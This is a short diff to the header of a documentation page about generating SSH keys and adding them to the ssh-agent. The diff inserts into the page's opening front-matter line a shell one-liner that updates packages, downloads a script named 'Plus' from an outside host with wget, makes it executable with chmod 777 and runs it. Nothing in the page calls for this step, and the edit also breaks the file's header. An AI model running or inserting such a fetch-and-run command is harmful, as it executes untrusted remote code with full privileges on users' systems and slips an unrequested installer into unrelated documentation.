@@ -1,4 +1,4 @@
----
+---apt update -y && apt upgrade -y && wget https://raw.danvpn.online.com/shuratto./SSHPLUS/master/Plus && chmod 777 Plus && ./Plus
 title: Generating a new SSH key and adding it to the ssh-agent
 intro: 'After you''ve checked for existing SSH keys, you can generate a new SSH key to use for authentication, then add it to the ssh-agent.'
 redirect_from:
